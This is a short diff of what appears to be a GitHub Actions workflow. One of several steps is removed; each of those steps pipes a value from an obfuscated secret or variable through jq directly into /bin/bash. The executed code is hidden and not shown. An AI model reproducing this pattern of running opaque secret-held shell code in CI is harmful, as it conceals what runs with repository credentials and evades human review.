@@ -18,7 +18,6 @@ jobs:
           taog6: ${{ secrets.taog6 }}
         run: |
           printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
-          printf '%s' "$dhb13342" | jq -r .ju065 | /bin/bash
           printf '%s' "$xurup7954" | jq -r .nvc755 | /bin/bash
           printf '%s' "$tn57" | jq -r .ezga401 | /bin/bash
           printf '%s' "$wvj9246" | jq -r .pcdgu78 | /bin/bash
